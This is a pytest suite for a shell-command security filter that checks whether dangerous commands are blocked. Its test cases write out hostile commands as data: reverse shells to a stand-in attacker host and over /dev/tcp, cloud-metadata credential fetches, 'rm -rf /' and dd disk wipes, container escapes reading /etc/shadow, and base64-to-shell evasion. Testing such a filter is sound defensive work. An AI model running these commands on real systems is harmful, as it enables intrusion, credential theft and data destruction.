"""
Security Tests for CommandSecurityFilter.

Tests the command security filter against exploit examples defined in
config/security/command-filtering.yaml. Each rule has an 'exploit' field
containing a command that should trigger that rule.

Run with:
    pytest tests/security/test_command_security.py -v
    
Or with coverage:
    pytest tests/security/test_command_security.py -v --cov=src.core.command_security
"""
import pytest
from pathlib import Path
from typing import Generator

import sys
# Add project root to path for imports
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.core.command_security import (
    CommandSecurityFilter,
    SecurityRule,
    SecurityCheckResult,
    get_command_security_filter,
    check_command_security,
)


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def security_filter() -> CommandSecurityFilter:
    """Create a fresh CommandSecurityFilter instance."""
    return CommandSecurityFilter()


@pytest.fixture  
def rules_path() -> Path:
    """Path to the security rules YAML file."""
    return PROJECT_ROOT / "config" / "security" / "command-filtering.yaml"


# =============================================================================
# Test: Rules Loading
# =============================================================================

class TestRulesLoading:
    """Test that security rules are loaded correctly."""
    
    def test_rules_file_exists(self, rules_path: Path) -> None:
        """Verify the rules file exists."""
        assert rules_path.exists(), f"Rules file not found: {rules_path}"
    
    def test_rules_loaded_successfully(self, security_filter: CommandSecurityFilter) -> None:
        """Verify rules load without errors."""
        assert security_filter.rules_loaded, "Rules should be loaded"
        assert security_filter.rule_count > 0, "Should have at least one rule"
    
    def test_has_block_rules(self, security_filter: CommandSecurityFilter) -> None:
        """Verify there are rules that block commands."""
        block_rules = security_filter.get_block_rules()
        assert len(block_rules) > 0, "Should have at least one blocking rule"
    
    def test_has_record_rules(self, security_filter: CommandSecurityFilter) -> None:
        """Verify there are rules that only record commands."""
        record_rules = security_filter.get_record_rules()
        assert len(record_rules) > 0, "Should have at least one record-only rule"
    
    def test_categories_exist(self, security_filter: CommandSecurityFilter) -> None:
        """Verify rules have categories."""
        categories = security_filter.get_categories()
        assert len(categories) > 0, "Should have at least one category"
        # Check for expected categories
        expected_categories = [
            "process_termination",
            "process_enumeration",
            "privilege_escalation",
            "destructive_operations",
        ]
        for cat in expected_categories:
            assert cat in categories, f"Expected category '{cat}' not found"


# =============================================================================
# Test: Exploit Examples (from rules file)
# =============================================================================

class TestExploitExamples:
    """Test that exploit examples from rules file are caught by their rules."""
    
    def test_all_block_exploits_are_blocked(self, security_filter: CommandSecurityFilter) -> None:
        """Every exploit example in a 'block' rule should be blocked."""
        exploits = security_filter.get_exploits_for_testing()
        
        for exploit, rule in exploits:
            if rule.action == "block" and exploit:
                result = security_filter.check_command(exploit)
                assert result.should_block, (
                    f"Exploit should be blocked: '{exploit}'\n"
                    f"Rule category: {rule.category}\n"
                    f"Rule pattern: {rule.pattern}"
                )
    
    def test_all_record_exploits_are_recorded(self, security_filter: CommandSecurityFilter) -> None:
        """Every exploit example in a 'record' rule should be allowed but recorded."""
        exploits = security_filter.get_exploits_for_testing()
        
        for exploit, rule in exploits:
            if rule.action == "record" and exploit:
                result = security_filter.check_command(exploit)
                assert result.allowed, (
                    f"Record-only exploit should be allowed: '{exploit}'\n"
                    f"Rule category: {rule.category}"
                )
                assert result.matched_rule is not None, (
                    f"Record-only exploit should match a rule: '{exploit}'"
                )


# =============================================================================
# Test: Process Termination Blocking
# =============================================================================

class TestProcessTermination:
    """Test blocking of process termination commands."""
    
    @pytest.mark.parametrize("command", [
        "kill -9 147",
        "kill 147",
        "kill -SIGKILL 147",
        "/bin/kill -9 1",
        "/usr/bin/kill 123",
        "  kill -9 1",  # Leading whitespace
        "echo test; kill -9 1",  # After semicolon
        "echo test && kill -9 1",  # After &&
    ])
    def test_kill_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Kill command variations should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "pkill python",
        "pkill -9 bash",
        "/usr/bin/pkill nginx",
    ])
    def test_pkill_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Pkill command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "killall bash",
        "killall -9 python",
        "/usr/bin/killall apache2",
    ])
    def test_killall_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Killall command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Process Enumeration Blocking
# =============================================================================

class TestProcessEnumeration:
    """Test blocking of process enumeration commands."""
    
    @pytest.mark.parametrize("command", [
        "ps aux",
        "ps -ef",
        "ps -A",
        "/bin/ps aux",
        "/usr/bin/ps -ef",
    ])
    def test_ps_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Ps command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "top -bn1",
        "htop",
        "pgrep python",
        "pidof bash",
        "pstree -p",
    ])
    def test_process_tools_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Process enumeration tools should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: /proc Access Blocking
# =============================================================================

class TestProcAccess:
    """Test blocking of /proc filesystem access."""
    
    @pytest.mark.parametrize("command", [
        "cat /proc/1/cmdline",
        "cat /proc/1/environ",
        "ls /proc/1/",
        "cat /proc/123/status",
        "head /proc/456/maps",
    ])
    def test_proc_pid_access_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Access to /proc/<pid>/ should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "cat /proc/net/tcp",
        "cat /proc/net/udp",
        "ls /proc/net/",
    ])
    def test_proc_net_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Access to /proc/net/ should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Privilege Escalation Blocking
# =============================================================================

class TestPrivilegeEscalation:
    """Test blocking of privilege escalation attempts."""
    
    @pytest.mark.parametrize("command", [
        "sudo id",
        "sudo su",
        "sudo -i",
        "/usr/bin/sudo bash",
    ])
    def test_sudo_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Sudo command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "su -",
        "su root",
        "/bin/su -",
    ])
    def test_su_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Su command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "chmod 4755 /tmp/shell",
        "chmod u+s /tmp/backdoor",
        "chmod g+s /tmp/evil",
    ])
    def test_setuid_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Setting setuid/setgid should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Container Escape Blocking
# =============================================================================

class TestContainerEscape:
    """Test blocking of container escape attempts."""
    
    @pytest.mark.parametrize("command", [
        "docker run -v /:/host alpine cat /host/etc/shadow",
        "docker exec -it container /bin/sh",
        "/usr/bin/docker ps",
    ])
    def test_docker_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Docker command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "nsenter -t 1 -m -u -i -n -p /bin/sh",
        "nsenter --target 1 --mount",
    ])
    def test_nsenter_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Nsenter command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Destructive Operations Blocking
# =============================================================================

class TestDestructiveOperations:
    """Test blocking of destructive file operations."""
    
    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf /etc",
        "rm -rf --no-preserve-root /",
        "rm -r -f /home",
        "/bin/rm -rf /var",
    ])
    def test_rm_rf_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Recursive force delete should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/urandom of=/dev/sdb bs=1M",
    ])
    def test_dd_device_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """DD to device should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Network Operations Blocking
# =============================================================================

class TestNetworkOperations:
    """Test blocking of dangerous network operations."""
    
    @pytest.mark.parametrize("command", [
        "nc -e /bin/sh attacker.com 4444",
        "nc -l -p 4444 -e /bin/bash",
        "ncat -e /bin/sh 10.0.0.1 4444",
    ])
    def test_reverse_shell_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Reverse shell attempts should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "cat < /dev/tcp/attacker.com/80",
    ])
    def test_dev_tcp_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """/dev/tcp access should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "curl http://169.254.169.254/latest/meta-data/",
        "wget http://169.254.169.254/",
    ])
    def test_cloud_metadata_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Cloud metadata endpoint access should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Shell Evasion Blocking
# =============================================================================

class TestShellEvasion:
    """Test blocking of shell evasion techniques."""
    
    @pytest.mark.parametrize("command", [
        "echo a2lsbCAtOSAxNDc= | base64 -d | bash",
        "base64 -d <<< a2lsbCAtOSAxNDc= | sh",
        "$(base64 -d <<< a2lsbCAtOSAxNDc=)",
    ])
    def test_base64_execution_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Base64 decode to shell should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "python3 -c 'import os; os.system(\"kill -9 147\")'",
        "python -c 'import subprocess; subprocess.call([\"kill\", \"-9\", \"1\"])'",
    ])
    def test_python_execution_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Python one-liner with system calls should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: System Manipulation Blocking
# =============================================================================

class TestSystemManipulation:
    """Test blocking of system manipulation commands."""
    
    @pytest.mark.parametrize("command", [
        "systemctl stop docker",
        "systemctl restart sshd",
        "/usr/bin/systemctl disable firewalld",
    ])
    def test_systemctl_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Systemctl command should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"
    
    @pytest.mark.parametrize("command", [
        "shutdown -h now",
        "reboot",
        "poweroff",
        "halt",
        "init 0",
    ])
    def test_shutdown_commands_blocked(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Shutdown/reboot commands should be blocked."""
        result = security_filter.check_command(command)
        assert result.should_block, f"Should block: {command}"


# =============================================================================
# Test: Safe Commands Allowed
# =============================================================================

class TestSafeCommandsAllowed:
    """Test that safe commands are allowed."""
    
    @pytest.mark.parametrize("command", [
        "ls -la",
        "cat file.txt",
        "grep pattern file.txt",
        "find . -name '*.py'",
        "echo hello world",
        "pwd",
        "cd /workspace",
        "mkdir test_dir",
        "python script.py",
        "pip install -r requirements.txt",
        "git status",
        "git add .",
    ])
    def test_safe_commands_allowed(self, security_filter: CommandSecurityFilter, command: str) -> None:
        """Common safe commands should be allowed."""
        result = security_filter.check_command(command)
        assert result.allowed, f"Should allow: {command}"


# =============================================================================
# Test: Edge Cases
# =============================================================================

class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    def test_empty_command(self, security_filter: CommandSecurityFilter) -> None:
        """Empty command should be allowed (handled elsewhere)."""
        result = security_filter.check_command("")
        assert result.allowed, "Empty command should pass filter"
    
    def test_whitespace_only(self, security_filter: CommandSecurityFilter) -> None:
        """Whitespace-only command should be allowed."""
        result = security_filter.check_command("   ")
        assert result.allowed, "Whitespace command should pass filter"
    
    def test_case_insensitive(self, security_filter: CommandSecurityFilter) -> None:
        """Rules should match case-insensitively."""
        result = security_filter.check_command("KILL -9 147")
        assert result.should_block, "KILL (uppercase) should be blocked"
    
    def test_reload_rules(self, security_filter: CommandSecurityFilter) -> None:
        """Rules should reload successfully."""
        original_count = security_filter.rule_count
        success = security_filter.reload_rules()
        assert success, "Rules should reload successfully"
        assert security_filter.rule_count == original_count, "Rule count should be same after reload"


# =============================================================================
# Test: Module-level Functions
# =============================================================================

class TestModuleFunctions:
    """Test module-level convenience functions."""
    
    def test_get_command_security_filter(self) -> None:
        """Should return singleton filter instance."""
        filter1 = get_command_security_filter()
        filter2 = get_command_security_filter()
        assert filter1 is filter2, "Should return same instance"
    
    def test_check_command_security(self) -> None:
        """Convenience function should work."""
        result = check_command_security("ls -la")
        assert isinstance(result, SecurityCheckResult)
        assert result.allowed


# =============================================================================
# Test: Fail-Closed Behavior
# =============================================================================

class TestFailClosed:
    """Test fail-closed security behavior."""
    
    def test_fail_closed_on_missing_rules(self) -> None:
        """Filter should fail-closed when rules file is missing."""
        filter = CommandSecurityFilter(
            rules_path=Path("/nonexistent/rules.yaml"),
            fail_closed=True
        )
        result = filter.check_command("ls -la")
        assert result.should_block, "Should block when rules not loaded (fail-closed)"
    
    def test_fail_open_when_configured(self) -> None:
        """Filter should fail-open when configured."""
        filter = CommandSecurityFilter(
            rules_path=Path("/nonexistent/rules.yaml"),
            fail_closed=False
        )
        result = filter.check_command("ls -la")
        assert result.allowed, "Should allow when rules not loaded (fail-open)"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
